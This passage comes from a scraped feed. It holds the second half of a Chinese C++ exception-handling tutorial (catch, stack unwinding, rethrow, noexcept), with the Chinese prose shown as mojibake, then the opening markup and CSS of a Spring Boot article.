    <span class="hljs-type">int</span> numbers[] = {<span class="hljs-number">10</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">20</span>};

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : numbers) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-built_in">checkValue</span>(n);
        }
        <span class="hljs-built_in">catch</span> (NegativeValueException&amp; e) {          <span class="hljs-comment">// æ•è·è‡ªå®šä¹‰å¼‚å¸¸</span>
            cout &lt;&lt; <span class="hljs-string">"æ•è·å¼‚å¸¸: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; <span class="hljs-string">" éæ³•å€¼ = "</span> &lt;&lt; e.<span class="hljs-built_in">getValue</span>() &lt;&lt; endl;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æ•°å€¼ä¸º: 10</span>
<span class="hljs-section">æ•è·å¼‚å¸¸: å‡ºç°è´Ÿå€¼é”™è¯¯ï¼ éæ³•å€¼ = -5</span>
<span class="hljs-section">æ•°å€¼ä¸º: 20</span>
</code></pre>
<h3 data-id="heading-6">æ•è·å¼‚å¸¸catch</h3>
<p>å¦‚å‰æ‰€è¿°ï¼Œ<code>catch</code> å—ç”¨æ¥æ¥æ”¶å¹¶å¤„ç† <code>try</code> å—ä¸­æŠ›å‡ºçš„å¼‚å¸¸ã€‚ <code>catch</code> æ‹¬å·é‡Œå¿…é¡»å†™ä¸€ä¸ª<strong>ä¸æŠ›å‡ºå¼‚å¸¸åŒç±»å‹</strong>çš„å½¢å‚ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">catch</span> (å¼‚å¸¸ç±»å‹ e) {
    <span class="hljs-comment">// å¤„ç†è¯­å¥</span>
}
</code></pre>
<p>å…¶ä¸­ <code>e</code> æ˜¯ç»™å¼‚å¸¸å¯¹è±¡èµ·çš„åå­—ã€‚ åªæœ‰å½“ <code>try</code> å—é‡ŒæŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ä¸è¿™é‡Œçš„ <code>å¼‚å¸¸ç±»å‹</code> åŒ¹é…æ—¶ï¼Œæ‰ä¼šè¿›å…¥è¯¥ <code>catch</code> å—æ‰§è¡Œå…¶å†…éƒ¨çš„ä»£ç ã€‚</p>
<h4 data-id="heading-7">A.æ•è·å¤šç§å¼‚å¸¸</h4>
<p>ä¸€ä¸ª <code>try</code> å—åé¢å¯ä»¥è·Ÿ<strong>å¤šä¸ª</strong> <code>catch</code> å—ï¼Œç”¨æ¥åˆ†åˆ«å¤„ç†ä¸åŒç±»å‹çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºå¤šç§å¼‚å¸¸çš„ä»£ç </span>
}
<span class="hljs-built_in">catch</span> (ç±»å‹<span class="hljs-number">1</span> e) {
    <span class="hljs-comment">// å½“æŠ›å‡ºçš„å¼‚å¸¸æ˜¯ç±»å‹1 æ—¶æ‰§è¡Œ</span>
}
<span class="hljs-built_in">catch</span> (ç±»å‹<span class="hljs-number">2</span> e) {
    <span class="hljs-comment">// å½“æŠ›å‡ºçš„å¼‚å¸¸æ˜¯ç±»å‹2 æ—¶æ‰§è¡Œ</span>
}
<span class="hljs-built_in">catch</span> (...) {
    <span class="hljs-comment">// å…œåº•ï¼šå‰é¢éƒ½æ²¡åŒ¹é…åˆ°æ—¶æ‰§è¡Œ</span>
}
</code></pre>
<p>è¯´æ˜</p>
<ul>
<li>ç¼–è¯‘å™¨ä¼šæŒ‰<strong>ä»ä¸Šåˆ°ä¸‹çš„é¡ºåº</strong>å¯»æ‰¾ç¬¬ä¸€ä¸ªç±»å‹åŒ¹é…çš„ <code>catch</code>ï¼›</li>
<li><code>catch(...)</code> ç§°ä¸ºâ€œé€šé…æ•è·â€ï¼Œå¯æ¥ä½<strong>ä»»ä½•ç±»å‹</strong>çš„å¼‚å¸¸ï¼Œå¸¸ç”¨æ¥åš<strong>æœ€åå…œåº•</strong>å¤„ç†ã€‚</li>
</ul>
<h4 data-id="heading-8">B.æŒ‰å€¼æˆ–æŒ‰å¼•ç”¨æ•è·</h4>
<p>ä¸å‡½æ•°ä¼ å‚ä¸€æ ·ï¼Œ<code>catch</code> ä¹Ÿèƒ½â€œæŒ‰å€¼â€æˆ–â€œæŒ‰å¼•ç”¨â€æ¥æ”¶å¼‚å¸¸å¯¹è±¡ï¼Œä¸¤è€…å„æœ‰ç”¨é€”ã€‚</p>
<h5 data-id="heading-9">B1. æŒ‰å€¼æ•è·</h5>
<p>ä¼š<strong>å¤åˆ¶</strong>ä¸€ä»½è¢«æŠ›å‡ºçš„å¼‚å¸¸å¯¹è±¡ã€‚ ç”±äºå¼‚å¸¸å¯¹è±¡é€šå¸¸ä¸å¤§ï¼Œå¤åˆ¶å¼€é”€ä¸€èˆ¬å¯æ¥å—ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">catch</span> (runtime_error e)          <span class="hljs-comment">// æŒ‰å€¼</span>
{
    cout &lt;&lt; <span class="hljs-string">"Caught: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>();
}
</code></pre>
<h5 data-id="heading-10">B2. æŒ‰å¼•ç”¨æ•è·</h5>
<p>ç›´æ¥ç»‘å®šåˆ°åŸå¼‚å¸¸å¯¹è±¡ï¼Œ<strong>æ— å¤åˆ¶å¼€é”€</strong>ï¼› æ ¸å¿ƒä¼˜åŠ¿åœ¨äºæ”¯æŒ<strong>å¤šæ€</strong>ï¼šå¯ä»¥ç”¨åŸºç±»å¼•ç”¨æ•è·æ´¾ç”Ÿç±»å¼‚å¸¸ï¼Œä»è€Œä¸€ä¸ª <code>catch</code> å°±èƒ½å¤„ç†æ•´ä¸ªç»§æ‰¿ä½“ç³»ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">catch</span> (exception&amp; e)             <span class="hljs-comment">// æŒ‰å¼•ç”¨ï¼ˆåŸºç±»ï¼‰</span>
{
    cout &lt;&lt; <span class="hljs-string">"Caught: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>();
}
</code></pre>
<p>ç¤ºä¾‹ä¸­æŠ›å‡ºçš„æ˜¯ <code>runtime_error</code>ï¼Œå´è¢« <code>exception&amp;</code> æˆåŠŸæ•è·ï¼Œè¿™å°±æ˜¯<strong>å¤šæ€å¼‚å¸¸å¤„ç†</strong>çš„å…¸å‹ç”¨æ³•ã€‚</p>
<h2 data-id="heading-11">å¼‚å¸¸ä¼ æ’­</h2>
<p>å¼‚å¸¸ä¼ æ’­æè¿°â€œå¼‚å¸¸åœ¨è°ƒç”¨æ ˆä¸­å¦‚ä½•å‘ä¸Šä¼ é€’â€ã€‚</p>
<ol>
<li>ä¸€æ—¦ <code>throw</code> æŠ›å‡ºå¼‚å¸¸ï¼Œ<strong>å½“å‰ä»£ç å—ç«‹å³ç»ˆæ­¢</strong>ï¼Œæ ˆä¸Šå·²æ„é€ çš„å±€éƒ¨å¯¹è±¡ä¼šè¢«<strong>è‡ªåŠ¨ææ„</strong>ï¼ˆæ ˆå›æº¯ï¼‰ï¼Œä½† <code>new</code> å‡ºæ¥çš„åŠ¨æ€èµ„æºéœ€è¦æ‰‹åŠ¨é‡Šæ”¾ã€‚</li>
<li>è¿è¡Œæ—¶æ²¿ç€è°ƒç”¨é“¾<strong>é€å¸§å‘ä¸Š</strong>æŸ¥æ‰¾ç±»å‹åŒ¹é…çš„ <code>catch</code> å—ï¼Œè¿™ä¸€è¿‡ç¨‹ç§°ä¸º <strong>stack unwindingï¼ˆæ ˆå±•å¼€ï¼‰</strong>ã€‚</li>
<li>æ‰¾åˆ°å¯¹åº” <code>catch</code> å³æ•è·å¹¶å¤„ç†ï¼›è‹¥æœ€ç»ˆä»æœªåŒ¹é…ï¼Œç¨‹åºè°ƒç”¨ <code>std::terminate()</code> ç»ˆæ­¢ã€‚</li>
</ol>
<p>ç¤ºä¾‹æµç¨‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GfG</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">GfG</span>()  { cout &lt;&lt; <span class="hljs-string">"Object Created\n"</span>; }
    ~<span class="hljs-built_in">GfG</span>() { cout &lt;&lt; <span class="hljs-string">"Object Destroyed\n"</span>; }
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">try</span> {
        cout &lt;&lt; <span class="hljs-string">"Inside try block\n"</span>;
        GfG gfg;      <span class="hljs-comment">// æ„é€ å±€éƒ¨å¯¹è±¡</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-number">10</span>;     <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸</span>
        cout &lt;&lt; <span class="hljs-string">"After throw\n"</span>;  <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
    }
    <span class="hljs-built_in">catch</span> (<span class="hljs-type">int</span> e) {
        cout &lt;&lt; <span class="hljs-string">"Exception Caught\n"</span>;
    }
    cout &lt;&lt; <span class="hljs-string">"After catch"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Inside</span> <span class="hljs-keyword">try</span> block
<span class="hljs-title class_">Object</span> <span class="hljs-title class_">Created</span>
<span class="hljs-title class_">Object</span> <span class="hljs-title class_">Destroyed</span>     â† æ ˆå±•å¼€æ—¶è‡ªåŠ¨ææ„
<span class="hljs-title class_">Exception</span> <span class="hljs-title class_">Caught</span>
<span class="hljs-title class_">After</span> <span class="hljs-keyword">catch</span>
</code></pre>
<h2 data-id="heading-12">åµŒå¥— try-catch å—</h2>
<p>åœ¨ C++ é‡Œï¼Œ<code>try-catch</code> å—å¯ä»¥<strong>åµŒå¥—</strong>åœ¨å¦ä¸€ä¸ª <code>try</code> æˆ– <code>catch</code> å—å†…éƒ¨ã€‚ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {                      <span class="hljs-comment">// å¤–å±‚</span>
    <span class="hljs-comment">// ... å¯èƒ½æŠ› e2</span>
    <span class="hljs-keyword">try</span> {                  <span class="hljs-comment">// å†…å±‚</span>
        <span class="hljs-comment">// ... å¯èƒ½æŠ› e1</span>
    }
    <span class="hljs-built_in">catch</span> (eType1 e1) {    <span class="hljs-comment">// å†…å±‚åªåŒ¹é… eType1</span>
        <span class="hljs-comment">// å¤„ç† e1</span>
    }
}
<span class="hljs-built_in">catch</span> (eType2 e2) {        <span class="hljs-comment">// å¤–å±‚å¯å¤„ç†å†…å±‚æœªæ¥ä½çš„å…¶ä»–å¼‚å¸¸</span>
    <span class="hljs-comment">// å¤„ç† e2</span>
}
</code></pre>
<ul>
<li>è‹¥å†…å±‚æŠ›å‡ºçš„å¼‚å¸¸<strong>ä¸æ˜¯</strong> <code>eType1</code>ï¼Œå†…å±‚ <code>catch</code> ä¸ä¼šæ‰§è¡Œï¼Œå¼‚å¸¸ç»§ç»­<strong>å‘å¤–å±‚ä¼ æ’­</strong>ï¼Œç”±å¤–å±‚ <code>catch</code> å°è¯•åŒ¹é…ã€‚</li>
<li>å¦‚æ­¤å¯å½¢æˆ<strong>å¤šçº§</strong>å¼‚å¸¸å¤„ç†é“¾ã€‚</li>
</ul>
<hr/>
<p>é‡æ–°æŠ›å‡ºå¼‚å¸¸ï¼ˆRethrowï¼‰ åœ¨å†…å±‚ <code>catch</code> ä¸­ï¼Œå¯ç”¨<strong>ç©º throw è¯­å¥</strong>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">throw</span>;   <span class="hljs-comment">// å¿…é¡»ä½äº catch å—å†…</span>
</code></pre>
<p>æŠŠå·²æ•è·çš„å¼‚å¸¸<strong>åŸæ ·å†æ¬¡æŠ›å‡º</strong>ï¼Œä¿ç•™å…¶ç±»å‹ä¸ä¿¡æ¯ï¼Œä¾›<strong>æ›´å¤–å±‚</strong> <code>catch</code> ç»§ç»­å¤„ç†ã€‚<br/>
è¿™ç§æ–¹å¼å¸¸ç”¨äº<strong>åˆ†å±‚å¤„ç†</strong>ï¼šåº•å±‚è®°å½•æ—¥å¿—/åšæ¸…ç†ï¼Œä¸Šå±‚å†³å®šæœ€ç»ˆç­–ç•¥ã€‚</p>
<h2 data-id="heading-13">å¼‚å¸¸è§„æ ¼è¯´æ˜</h2>
<p>C++ å…è®¸åœ¨å‡½æ•°å£°æ˜ä¸­<strong>æ˜¾å¼è¯´æ˜</strong>è¯¥å‡½æ•°æ˜¯å¦å¯èƒ½æŠ›å‡ºå¼‚å¸¸ã€‚ç°ä»£ C++ åªæœ‰ä¸¤ç§è§„æ ¼ï¼š</p>

















<table><thead><tr><th>è§„æ ¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>noexcept</code></td><td><strong>ä¿è¯</strong>æ­¤å‡½æ•°<strong>ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</strong>ï¼›è‹¥è¿è¡Œæ—¶ä»æŠ›å‡ºï¼Œå°†è°ƒ <code>std::terminate()</code> ç»ˆæ­¢ç¨‹åºã€‚</td></tr><tr><td><code>noexcept(false)</code></td><td><strong>å¯èƒ½æŠ›å‡ºå¼‚å¸¸</strong>ï¼›è¿™æ˜¯<strong>é»˜è®¤è¡Œä¸º</strong>ï¼ˆä¸å†™ä»»ä½•è§„æ ¼æ—¶å³ä¸ºæ­¤ï¼‰ã€‚</td></tr></tbody></table>
<p>å†™æ³•ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> <span class="hljs-keyword">noexcept</span>          <span class="hljs-comment">// æ‰¿è¯ºä¸æŠ›å¼‚å¸¸</span>
</span>{
    <span class="hljs-comment">// ...</span>
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> b)</span> <span class="hljs-title">noexcept</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span>   <span class="hljs-comment">// å…è®¸æŠ›å¼‚å¸¸ï¼ˆå¯çœç•¥ä¸å†™ï¼‰</span>
</span>{
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<blockquote>
<p>æ³¨ï¼šæ—§å¼ <code>throw(type-list)</code> è§„æ ¼å·²åœ¨ C++11 èµ·è¢«<strong>åºŸå¼ƒ</strong>ï¼Œç°ä»£ä»£ç åº”ä½¿ç”¨ <code>noexcept</code>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot ä¸åªæ˜¯è‡ªåŠ¨è£…é…ï¼šè®©ä½ ä¸“æ³¨ä¸šåŠ¡ï¼Œè€Œä¸æ˜¯é…ç½®]]></title>    <link>https://juejin.cn/post/7581870491755495459</link>    <guid>https://juejin.cn/post/7581870491755495459</guid>    <pubDate>2025-12-09T16:22:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491755495459" data-draft-id="7581688255625838644" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot ä¸åªæ˜¯è‡ªåŠ¨è£…é…ï¼šè®©ä½ ä¸“æ³¨ä¸šåŠ¡ï¼Œè€Œä¸æ˜¯é…ç½®"/> <meta itemprop="keywords" content="åç«¯,Java,Spring Boot"/> <meta itemprop="datePublished" content="2025-12-09T16:22:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ€è´ªåƒçš„è™"/> <meta itemprop="url" content="https://juejin.cn/user/1109832819826707"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot ä¸åªæ˜¯è‡ªåŠ¨è£…é…ï¼šè®©ä½ ä¸“æ³¨ä¸šåŠ¡ï¼Œè€Œä¸æ˜¯é…ç½®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1109832819826707/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ€è´ªåƒçš„è™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T16:22:03.000Z" title="Tue Dec 09 2025 16:22:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body 